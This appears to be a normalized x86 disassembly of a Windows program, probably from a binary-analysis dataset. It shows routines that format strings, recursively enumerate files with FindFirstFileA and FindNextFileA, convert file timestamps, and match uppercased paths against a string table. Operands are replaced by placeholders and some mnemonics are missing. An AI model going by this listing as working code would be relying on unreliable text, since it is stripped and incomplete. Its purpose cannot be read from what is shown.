push rw-data
push edx
mov esi eax
call sprintf
add esp 0xc
cmp esi 0x3
je r-xdata
push rw-data
call sub_4024e0
mov eax [ rw-data ]
add esp 0x4
test eax eax
je r-xdata
inc edi
dec ebp
jne r-xdata
push rw-data
call _strdup
add esp 0x4
push rw-data
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call sprintf
lea edx [ esp + 0x1c ]
push rw-data
push edx
call fopen
mov esi eax
add esp 0x14
test esi esi
je r-xdata
push esi
call fclose
mov ecx [ rw-data ]
push ecx
call free
lea edx [ esp + 0x18 ]
push edx
call sub_4039b0
lea eax [ esp + 0x1c ]
push eax
call sub_402220
push rw-data
call _strdup
add esp 0x14
jmp r-xdata
mov eax [ rw-data ]
push eax
push rw-data
push esi
call fprintf
add esp 0xc
mov edx eax
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
pop edi
dec ecx
pop esi
pop ebp
mov [ rw-data ] ecx
mov eax edx
pop ebx
add esp 0x288
retn
sub_4024e0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov edx [ rw-data ]
or ecx 0xffffffff
mov edi edx
push ebx
[ edi ]
not ecx
dec ecx
mov edi esi
mov ebx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ ebx + ecx + 0x1 ]
push eax
push edx
call realloc
mov edx eax
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x8
mov [ rw-data ] edx
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
pop ebx
and ecx 0x3
mov eax 0x1
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402560
sub esp 0x520
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ rw-data ]
mov [ esp + 0x4 ] ecx
xor ecx ecx
mov [ esp + 0x8 ] edx
mov edx [ rw-data ]
mov [ esp + 0xd ] ecx
mov [ esp + 0x11 ] ecx
mov [ esp + 0x1e ] edx
mov [ esp + 0x15 ] ecx
xor edx edx
mov [ esp ] eax
mov al [ rw-data ]
mov [ esp + 0x19 ] ecx
mov [ esp + 0x27 ] edx
mov [ esp + 0xc ] al
mov eax [ rw-data ]
mov [ esp + 0x1d ] cl
mov cl [ rw-data ]
mov [ esp + 0x2b ] edx
mov [ esp + 0x22 ] eax
mov eax [ rw-data ]
mov [ esp + 0x2f ] edx
mov [ esp + 0x26 ] cl
mov cl [ rw-data ]
push ebp
mov [ esp + 0x37 ] edx
push esi
push edi
mov [ esp + 0x43 ] edx
mov [ esp + 0x48 ] eax
mov [ esp + 0x4c ] cl
mov ecx 0x6
xor eax eax
lea edi [ esp + 0x4d ]
mov [ esp + 0x47 ] dl
mov edx [ rw-data ]
[ edi ]
stosb [ edi ]
mov [ esp + 0x66 ] edx
xor edx edx
mov cl [ rw-data ]
mov [ esp + 0x6f ] edx
mov [ esp + 0x73 ] edx
mov eax [ rw-data ]
mov [ esp + 0x77 ] edx
mov [ esp + 0x6e ] cl
mov ecx [ rw-data ]
mov [ esp + 0x7b ] edx
mov [ esp + 0x7f ] edx
mov [ esp + 0x88 ] ecx
mov [ esp + 0x83 ] dl
mov edx [ rw-data ]
mov [ esp + 0x8c ] edx
mov edx [ rw-data ]
xor ecx ecx
mov [ esp + 0x6a ] eax
mov eax [ rw-data ]
mov [ esp + 0x92 ] ecx
mov [ esp + 0xa2 ] edx
mov [ esp + 0x96 ] ecx
xor edx edx
mov [ esp + 0x84 ] eax
mov ax [ rw-data ]
mov [ esp + 0x9a ] ecx
mov [ esp + 0xae ] edx
mov [ esp + 0x90 ] ax
mov eax [ rw-data ]
mov [ esp + 0x9e ] ecx
mov ecx [ rw-data ]
mov [ esp + 0xb2 ] edx
mov [ esp + 0xb6 ] edx
mov [ esp + 0xa6 ] eax
mov eax [ rw-data ]
mov [ esp + 0xaa ] ecx
mov ecx [ rw-data ]
mov [ esp + 0xba ] edx
mov [ esp + 0xbe ] dx
mov [ esp + 0xc0 ] eax
mov [ esp + 0xc4 ] ecx
xor eax eax
mov dl [ rw-data ]
mov [ esp + 0xc9 ] eax
mov ecx 0x6
mov [ esp + 0xcd ] eax
mov esi rw-data
mov [ esp + 0xd1 ] eax
lea edi [ esp + 0xde ]
mov [ esp + 0xd5 ] eax
mov [ esp + 0xc8 ] dl
mov [ esp + 0xd9 ] eax
mov edx [ rw-data ]
mov [ esp + 0xdd ] al
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov [ esp + 0xf8 ] eax
mov [ esp + 0x104 ] eax
mov [ esp + 0x108 ] eax
mov ecx [ rw-data ]
mov [ esp + 0x10c ] eax
mov [ esp + 0xfc ] ecx
mov [ esp + 0x110 ] eax
mov ecx [ rw-data ]
mov [ esp + 0x114 ] eax
mov [ esp + 0x11a ] ecx
mov [ esp + 0x118 ] ax
mov eax [ rw-data ]
mov [ esp + 0x122 ] eax
xor eax eax
mov [ esp + 0x129 ] eax
mov cx [ rw-data ]
mov [ esp + 0x12d ] eax
mov [ esp + 0x126 ] cx
mov [ esp + 0x131 ] eax
mov ecx [ rw-data ]
mov [ esp + 0x135 ] ax
mov [ esp + 0x100 ] edx
mov edx [ rw-data ]
mov [ esp + 0x137 ] al
mov eax [ rw-data ]
mov [ esp + 0x138 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x140 ] eax
xor eax eax
mov [ esp + 0x11e ] edx
mov dl [ rw-data ]
mov [ esp + 0x149 ] eax
mov [ esp + 0x14d ] eax
mov [ esp + 0x144 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x151 ] eax
mov [ esp + 0x128 ] dl
mov edx [ rw-data ]
mov [ esp + 0x155 ] al
mov [ esp + 0x156 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x15e ] eax
mov [ esp + 0x13c ] edx
mov dl [ rw-data ]
mov [ esp + 0x162 ] eax
mov [ esp + 0x174 ] ecx
mov [ esp + 0x166 ] eax
xor ecx ecx
mov [ esp + 0x148 ] dl
mov edx [ rw-data ]
mov [ esp + 0x16a ] eax
mov [ esp + 0x17e ] ecx
mov [ esp + 0x15a ] edx
mov edx [ rw-data ]
mov [ esp + 0x16e ] eax
mov [ esp + 0x182 ] ecx
mov [ esp + 0x172 ] ax
mov ax [ rw-data ]
mov [ esp + 0x186 ] ecx
mov [ esp + 0x178 ] edx
mov edx [ rw-data ]
mov [ esp + 0x18a ] ecx
mov [ esp + 0x17c ] ax
mov eax [ rw-data ]
mov [ esp + 0x18e ] ecx
mov [ esp + 0x192 ] edx
mov edx [ rw-data ]
mov [ esp + 0x19a ] ecx
mov [ esp + 0x1b0 ] edx
xor edx edx
mov [ esp + 0x1b7 ] edx
mov [ esp + 0x19e ] ecx
mov [ esp + 0x1bb ] edx
mov [ esp + 0x196 ] eax
mov ax [ rw-data ]
mov [ esp + 0x1bf ] edx
mov [ esp + 0x1c3 ] edx
mov [ esp + 0x1a2 ] ecx
mov [ esp + 0x1c7 ] edx
mov [ esp + 0x1a6 ] ecx
mov [ esp + 0x1cb ] dx
mov [ esp + 0x1b4 ] ax
mov eax [ rw-data ]
mov [ esp + 0x1cd ] dl
mov [ esp + 0x1aa ] ecx
mov [ esp + 0x1d6 ] edx
mov [ esp + 0x1ae ] cx
mov cl [ rw-data ]
mov [ esp + 0x1ce ] eax
mov eax [ rw-data ]
mov [ esp + 0x1da ] edx
mov [ esp + 0x1b6 ] cl
mov ecx [ rw-data ]
mov [ esp + 0x1de ] edx
mov [ esp + 0x1ec ] eax
mov [ esp + 0x1e2 ] edx
xor eax eax
mov [ esp + 0x1d2 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x1e6 ] edx
mov [ esp + 0x1f6 ] eax
mov [ esp + 0x1ea ] dx
mov dx [ rw-data ]
mov [ esp + 0x1fa ] eax
mov [ esp + 0x1f0 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x1fe ] eax
mov [ esp + 0x1f4 ] dx
mov dx [ rw-data ]
mov [ esp + 0x202 ] eax
mov [ esp + 0x20a ] ecx
mov ecx 0x6
lea edi [ esp + 0x210 ]
mov [ esp + 0x206 ] eax
mov [ esp + 0x20e ] dx
mov edx [ rw-data ]
[ edi ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov [ esp + 0x22c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x228 ] eax
xor eax eax
mov [ esp + 0x246 ] ecx
xor ecx ecx
mov [ esp + 0x234 ] eax
mov [ esp + 0x24f ] ecx
mov [ esp + 0x238 ] eax
mov [ esp + 0x253 ] ecx
mov [ esp + 0x23c ] eax
mov [ esp + 0x257 ] ecx
mov [ esp + 0x240 ] eax
mov [ esp + 0x25b ] ecx
mov [ esp + 0x230 ] edx
mov edx [ rw-data ]
mov [ esp + 0x244 ] ax
mov al [ rw-data ]
mov [ esp + 0x25f ] ecx
mov [ esp + 0x24a ] edx
mov edx [ rw-data ]
mov [ esp + 0x24e ] al
mov eax [ rw-data ]
mov [ esp + 0x263 ] cl
mov ecx [ rw-data ]
mov [ esp + 0x264 ] edx
mov [ esp + 0x268 ] eax
mov [ esp + 0x26c ] ecx
mov dx [ rw-data ]
xor eax eax
mov [ esp + 0x270 ] dx
mov edx [ rw-data ]
mov [ esp + 0x286 ] edx
xor edx edx
mov [ esp + 0x272 ] eax
mov [ esp + 0x28d ] edx
mov [ esp + 0x276 ] eax
mov [ esp + 0x291 ] edx
mov [ esp + 0x27a ] eax
mov [ esp + 0x295 ] edx
mov [ esp + 0x27e ] eax
mov ax [ rw-data ]
mov [ esp + 0x299 ] edx
mov [ esp + 0x28a ] ax
mov eax [ rw-data ]
mov [ esp + 0x29d ] dx
mov [ esp + 0x29f ] dl
mov edx [ rw-data ]
mov [ esp + 0x2a0 ] eax
mov ax [ rw-data ]
mov ecx [ rw-data ]
mov [ esp + 0x2a8 ] edx
mov [ esp + 0x2ac ] ax
mov eax [ rw-data ]
xor edx edx
mov [ esp + 0x2be ] eax
mov [ esp + 0x2af ] edx
xor eax eax
mov [ esp + 0x2b3 ] edx
mov [ esp + 0x2c7 ] eax
mov [ esp + 0x2b7 ] edx
mov [ esp + 0x2cb ] eax
mov [ esp + 0x2bb ] dx
mov [ esp + 0x282 ] ecx
mov cl [ rw-data ]
mov [ esp + 0x2bd ] dl
mov dl [ rw-data ]
mov [ esp + 0x2cf ] eax
mov [ esp + 0x28c ] cl
mov ecx [ rw-data ]
mov [ esp + 0x2d3 ] eax
mov [ esp + 0x2c6 ] dl
mov edx [ rw-data ]
mov [ esp + 0x2d7 ] eax
mov [ esp + 0x2a4 ] ecx
mov cl [ rw-data ]
mov [ esp + 0x2db ] al
mov [ esp + 0x2e0 ] edx
mov edx [ rw-data ]
mov [ esp + 0x2e4 ] eax
mov [ esp + 0x2ae ] cl
mov ecx [ rw-data ]
mov [ esp + 0x2e8 ] eax
mov [ esp + 0x2fe ] edx
xor edx edx
mov [ esp + 0x2c2 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x2ec ] eax
mov [ esp + 0x307 ] edx
mov [ esp + 0x2f0 ] eax
mov [ esp + 0x2dc ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x30b ] edx
mov [ esp + 0x2f4 ] eax
mov [ esp + 0x30f ] edx
mov [ esp + 0x2f8 ] ax
mov eax [ rw-data ]
mov [ esp + 0x2fa ] ecx
mov cl [ rw-data ]
mov [ esp + 0x313 ] edx
mov [ esp + 0x302 ] eax
mov eax [ rw-data ]
mov [ esp + 0x306 ] cl
mov ecx [ rw-data ]
mov [ esp + 0x317 ] dl
mov edx [ rw-data ]
mov [ esp + 0x318 ] eax
mov [ esp + 0x31c ] ecx
mov [ esp + 0x320 ] edx
mov al [ rw-data ]
mov edx [ rw-data ]
xor ecx ecx
mov [ esp + 0x324 ] al
mov eax [ rw-data ]
mov [ esp + 0x325 ] ecx
mov [ esp + 0x329 ] ecx
mov [ esp + 0x336 ] edx
mov [ esp + 0x32d ] ecx
xor edx edx
mov [ esp + 0x33a ] eax
mov eax [ rw-data ]
mov [ esp + 0x331 ] ecx
mov [ esp + 0x340 ] edx
mov [ esp + 0x335 ] cl
mov cx [ rw-data ]
mov [ esp + 0x344 ] edx
mov [ esp + 0x354 ] eax
xor eax eax
mov [ esp + 0x348 ] edx
mov [ esp + 0x33e ] cx
mov ecx [ rw-data ]
mov [ esp + 0x35d ] eax
mov [ esp + 0x34c ] edx
mov [ esp + 0x361 ] eax
mov [ esp + 0x350 ] edx
mov dl [ rw-data ]
mov [ esp + 0x358 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x365 ] eax
mov [ esp + 0x35c ] dl
mov dx [ rw-data ]
mov [ esp + 0x369 ] eax
mov [ esp + 0x372 ] ecx
xor ecx ecx
mov [ esp + 0x36d ] eax
mov [ esp + 0x376 ] dx
mov edx [ rw-data ]
mov [ esp + 0x379 ] ecx
mov [ esp + 0x371 ] al
mov al [ rw-data ]
mov [ esp + 0x37d ] ecx
mov [ esp + 0x390 ] edx
mov [ esp + 0x378 ] al
mov ax [ rw-data ]
mov [ esp + 0x381 ] ecx
xor edx edx
mov [ esp + 0x385 ] ecx
mov [ esp + 0x397 ] edx
mov [ esp + 0x394 ] ax
mov eax [ rw-data ]
mov [ esp + 0x389 ] ecx
mov [ esp + 0x39b ] edx
mov [ esp + 0x38d ] cx
mov [ esp + 0x39f ] edx
mov [ esp + 0x3ae ] eax
xor eax eax
mov [ esp + 0x38f ] cl
mov cl [ rw-data ]
mov [ esp + 0x3a3 ] edx
mov [ esp + 0x3b8 ] eax
mov [ esp + 0x3a7 ] edx
mov [ esp + 0x396 ] cl
mov ecx [ rw-data ]
mov [ esp + 0x3bc ] eax
mov [ esp + 0x3ab ] dx
mov [ esp + 0x3c0 ] eax
mov [ esp + 0x3ad ] dl
mov dx [ rw-data ]
mov [ esp + 0x3b2 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x3c4 ] eax
mov [ esp + 0x3b6 ] dx
mov edx [ rw-data ]
mov [ esp + 0x3c8 ] eax
mov al [ rw-data ]
mov [ esp + 0x3cc ] ecx
xor ecx ecx
mov [ esp + 0x3d0 ] edx
mov [ esp + 0x3d4 ] al
mov [ esp + 0x3d5 ] ecx
mov [ esp + 0x3d9 ] ecx
mov dx [ rw-data ]
mov [ esp + 0x3dd ] ecx
xor eax eax
mov [ esp + 0x3e1 ] ecx
lea edi [ esp + 0x3ec ]
mov [ esp + 0x3e5 ] ecx
mov [ esp + 0x3ea ] dx
mov [ esp + 0x3e9 ] cl
mov ecx 0x7
[ edi ]
mov ecx 0x7
lea edi [ esp + 0x408 ]
[ edi ]
mov esi [ esp + 0x530 ]
lea ebp [ esp + 0x428 ]
stosw [ edi ]
xor edi edi
sub ebp esi
mov al [ esp + 0xc ]
mov [ esp + edi + 0x428 ] 0x0
xor edi edi
test al al
je r-xdata
movsx eax al
push eax
call toupper
add esp 0x4
mov [ esi + ebp ] al
inc edi
inc esi
cmp edi 0x104
jl r-xdata
lea eax [ edi + edi * 2 ]
pop edi
pop esi
pop ebp
lea edx [ eax + eax * 4 ]
xor eax eax
mov cl [ esp + edx * 2 ]
test cl cl
sete al
add esp 0x520
retn
lea eax [ esp + 0xc ]
lea esi [ esp + 0xc ]
mov al [ esi ]
test al al
je r-xdata
mov cl [ esi + 0x1e ]
add esi 0x1e
inc edi
mov eax esi
test cl cl
jne r-xdata
lea ecx [ esp + 0x428 ]
push eax
push ecx
call strstr
add esp 0x8
test eax eax
jne r-xdata
sub_402ff0
mov eax [ esp + 0x4 ]
push esi
push edi
push eax
push rw-data
call sprintf
add esp 0x8
mov [ rw-data ] 0x1
xor esi esi
mov edi rw-data
push edi
call sub_403040
push 0x1
call _sleep
mov eax [ rw-data ]
add esp 0x8
inc esi
add edi 0x104
cmp esi eax
jl r-xdata
pop edi
xor eax eax
pop esi
retn
sub_403040
sub esp 0x2d4
push ebx
push esi
mov esi [ esp + 0x2e0 ]
push edi
xor ebx ebx
push esi
mov [ esp + 0x1c ] ebx
call _strdup
mov edi eax
push 0x5c
push edi
mov [ esp + 0x20 ] edi
call strrchr
add esp 0xc
mov [ eax ] bl
lea eax [ esp + 0x38 ]
push eax
push esi
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x1c ] eax
je r-xdata
cmp edi ebx
je r-xdata
lea ecx [ esp + 0x30 ]
push ebp
lea edx [ esp + 0x50 ]
push ecx
push edx
call [ FileTimeToLocalFileTime@IAT ]
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x34 ]
push eax
push ecx
call [ FileTimeToSystemTime@IAT ]
test [ esp + 0x3c ] 0x10
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x2d4
retn
push edi
call free
add esp 0x4
lea edi [ esp + 0x68 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x4
jb r-xdata
mov esi rw-data
lea eax [ esp + 0x68 ]
mov esi [ esp + 0x20 ]
lea edx [ esp + 0x3c ]
push edx
push esi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
xor edx edx
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
push esi
call [ FindClose@IAT ]
mov eax [ esp + 0x1c ]
pop ebp
cmp eax 0x1
jne r-xdata
lea eax [ esp + 0x34 ]
lea ecx [ esp + 0x50 ]
push eax
push ecx
call [ FileTimeToLocalFileTime@IAT ]
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x34 ]
push edx
push eax
call [ FileTimeToSystemTime@IAT ]
test [ esp + 0x3c ] 0x10
je r-xdata
lea edi [ esp + 0x68 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
inc edx
cmp edx 0x4
mov al [ esp + ecx + 0x64 ]
mov [ esp + edx + 0xf ] al
jl r-xdata
mov al [ rw-data ]
xor ebp ebp
cmp al bl
mov [ esp + 0x14 ] bl
je r-xdata
mov esi rw-data
lea eax [ esp + 0x68 ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov edi [ esp + 0x14 ]
lea eax [ esp + 0x178 ]
push rw-data
push eax
call sprintf
lea ecx [ esp + 0x180 ]
push ecx
call sub_4024e0
add esp 0xc
lea edi [ esp + 0x68 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x4
jb r-xdata
mov esi rw-data
lea eax [ esp + 0x68 ]
cmp [ ebp + ebp * 4 + rw-data ] bl
je r-xdata
mov edx rw-data
mov esi edx
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi [ esp + 0x20 ]
lea edx [ esp + 0x3c ]
push edx
push esi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
xor edx edx
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
mov edx [ esp + 0x2e8 ]
lea eax [ esp + 0x17c ]
push edx
push rw-data
push eax
mov [ esp + 0x28 ] 0x1
call sprintf
lea ecx [ esp + 0x188 ]
push ecx
call sub_4024e0
mov ecx [ esp + 0x3e ]
mov eax [ esp + 0x6c ]
lea edx [ esp + 0x78 ]
and ecx 0xffff
push edx
mov edx [ esp + 0x40 ]
push eax
mov eax [ esp + 0x42 ]
and edx 0xffff
push ecx
mov ecx [ esp + 0x42 ]
push edx
mov edx [ esp + 0x44 ]
and eax 0xffff
and ecx 0xffff
push eax
and edx 0xffff
push ecx
push edx
lea eax [ esp + 0x1a8 ]
push rw-data
push eax
call sprintf
lea ecx [ esp + 0x1b0 ]
push ecx
call sub_4024e0
add esp 0x38
mov al [ esi + 0x5 ]
add esi 0x5
inc ebp
cmp al bl
mov edx esi
jne r-xdata
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x68 ]
push eax
push ecx
lea edx [ esp + 0x184 ]
push rw-data
push edx
call sprintf
mov eax [ rw-data ]
add esp 0x10
cmp eax 0x3a98
jge r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
lea edi [ esp + 0x68 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
inc edx
cmp edx 0x4
mov al [ esp + ecx + 0x64 ]
mov [ esp + edx + 0xf ] al
jl r-xdata
mov al [ rw-data ]
xor ebp ebp
cmp al bl
mov [ esp + 0x14 ] bl
je r-xdata
mov esi rw-data
lea eax [ esp + 0x68 ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x14 ]
push ecx
push edx
call _strnicmp
add esp 0xc
test eax eax
je r-xdata
lea eax [ esp + 0x17c ]
push eax
call sub_402560
add esp 0x4
cmp eax 0x1
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
cmp [ ebp + ebp * 4 + rw-data ] bl
je r-xdata
mov edx rw-data
mov esi edx
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0x17c ]
mov ecx eax
push edx
shl ecx 0x6
add ecx eax
inc eax
push rw-data
mov [ rw-data ] eax
lea ecx [ ecx * 4 + rw-data ]
push ecx
call sprintf
add esp 0xc
jmp r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
cmp [ esp + 0x1c ] ebx
jne r-xdata
mov al [ esi + 0x5 ]
add esi 0x5
inc ebp
cmp al bl
mov edx esi
jne r-xdata
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x68 ]
push eax
push ecx
lea edx [ esp + 0x184 ]
push rw-data
push edx
call sprintf
mov eax [ rw-data ]
add esp 0x10
cmp eax 0x3a98
jge r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov ecx [ esp + 0x2e ]
mov eax [ esp + 0x5c ]
lea edx [ esp + 0x68 ]
and ecx 0xffff
push edx
mov edx [ esp + 0x30 ]
push eax
mov eax [ esp + 0x32 ]
and edx 0xffff
push ecx
mov ecx [ esp + 0x32 ]
push edx
mov edx [ esp + 0x34 ]
and eax 0xffff
and ecx 0xffff
push eax
and edx 0xffff
push ecx
push edx
lea eax [ esp + 0x198 ]
push rw-data
push eax
call sprintf
lea ecx [ esp + 0x1a0 ]
push ecx
call sub_4024e0
add esp 0x28
mov edx [ esp + 0x2e8 ]
lea eax [ esp + 0x17c ]
push edx
push rw-data
push eax
mov [ esp + 0x28 ] 0x1
call sprintf
lea ecx [ esp + 0x188 ]
push ecx
call sub_4024e0
add esp 0x10
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x14 ]
push ecx
push edx
call _strnicmp
add esp 0xc
test eax eax
je r-xdata
lea eax [ esp + 0x17c ]
push eax
call sub_402560
add esp 0x4
cmp eax 0x1
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0x17c ]
mov ecx eax
push edx
shl ecx 0x6
add ecx eax
inc eax
push rw-data
mov [ rw-data ] eax
lea ecx [ ecx * 4 + rw-data ]
push ecx
call sprintf
add esp 0xc
jmp r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_403580
sub esp 0x260
push ebx
push ebp
push esi
push edi
push 0x184
call malloc
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
mov eax [ esp + 0x274 ]
cmp [ eax ] 0x0
je r-xdata
push 0x1
call exit
mov eax [ rw-data ]
push eax
call _strdup
add esp 0x4
mov [ esp + 0x10 ] eax
mov edi eax
mov esi eax
push eax
call sub_404bb0
mov esi eax
add esp 0x4
mov [ esp + 0x10 ] esi
mov edi esi
jmp r-xdata
mov al [ edi - 0x1 ]
push esi
cmp al 0x5c
je r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
push esi
push rw-data
push ebp
call sprintf
mov al [ esi ]
add esp 0xc
test al al
je r-xdata
lea edx [ esp + 0x30 ]
push rw-data
push edx
lea ecx [ esp + 0x30 ]
push rw-data
push ecx
jmp r-xdata
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x144 ]
push eax
push ecx
call [ FileTimeToLocalFileTime@IAT ]
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x24 ]
push edx
push eax
call [ FileTimeToSystemTime@IAT ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1e ]
mov eax [ esp + 0x1c ]
and ecx 0xffff
and edx 0xffff
push ecx
mov ecx [ esp + 0x1e ]
and eax 0xffff
push edx
mov edx [ esp + 0x1e ]
push eax
mov eax [ esp + 0x20 ]
and ecx 0xffff
and edx 0xffff
push ecx
and eax 0xffff
push edx
push eax
lea ecx [ esp + 0x44 ]
push rw-data
push ecx
call sprintf
lea edi [ esp + 0x4c ]
or ecx 0xffffffff
xor eax eax
add esp 0x20
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
test [ esp + 0x130 ] 0x10
je r-xdata
lea edx [ esp + 0x130 ]
push edx
push esi
call edi
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
call sprintf
mov edi [ FindFirstFileA@IAT ]
add esp 0xc
lea eax [ esp + 0x130 ]
lea ecx [ esp + 0x2c ]
push eax
push ecx
call edi
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov ecx [ esp + 0x150 ]
lea edx [ esp + 0x2c ]
push ecx
push rw-data
push edx
call sprintf
add esp 0xc
lea eax [ esp + 0x2c ]
push rw-data
push eax
call sprintf
add esp 0x8
jmp r-xdata
push esi
push rw-data
push ebp
call sprintf
add esp 0xc
push ebx
call [ FindClose@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x10 ]
jmp r-xdata
push ebp
call _msize
add eax 0x184
push eax
push ebp
call realloc
mov ebp eax
add esp 0xc
test ebp ebp
je r-xdata
lea edi [ esp + 0x2c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x15c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x30 ]
push rw-data
push ecx
call sprintf
lea edi [ esp + 0x38 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x130 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push ebx
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
test ebp ebp
je r-xdata
push esi
call free
add esp 0x4
push ebp
call _strdup
mov ebx eax
or ecx 0xffffffff
mov edi ebx
xor eax eax
add esp 0x4
[ edi ]
not ecx
dec ecx
test esi esi
mov [ rw-data ] ecx
je r-xdata
push 0x1
call exit
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x144 ]
push ecx
push edx
call [ FileTimeToLocalFileTime@IAT ]
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x24 ]
push eax
push ecx
call [ FileTimeToSystemTime@IAT ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x1e ]
mov ecx [ esp + 0x1c ]
and edx 0xffff
and eax 0xffff
push edx
mov edx [ esp + 0x1e ]
and ecx 0xffff
push eax
mov eax [ esp + 0x1e ]
push ecx
mov ecx [ esp + 0x20 ]
and edx 0xffff
and eax 0xffff
push edx
and ecx 0xffff
push eax
push ecx
lea edx [ esp + 0x44 ]
push rw-data
push edx
call sprintf
lea edi [ esp + 0x4c ]
or ecx 0xffffffff
xor eax eax
add esp 0x20
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
test [ esp + 0x130 ] 0x10
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x260
retn
push ebp
call free
add esp 0x4
mov ecx [ esp + 0x150 ]
